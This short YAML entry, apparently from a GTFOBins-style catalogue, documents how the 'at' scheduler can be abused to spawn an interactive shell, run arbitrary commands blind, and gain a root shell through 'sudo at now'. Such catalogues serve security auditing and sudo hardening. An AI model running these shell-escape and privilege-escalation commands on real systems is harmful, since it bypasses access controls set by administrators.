---
functions:
  shell:
    - code: |
        echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
  command:
    - description: The invocation will be blind, but it is possible to redirect the output to a file in a readable location.
      code: |
        COMMAND=id
        echo "$COMMAND" | at now
  sudo:
    - code: |
        echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null
---
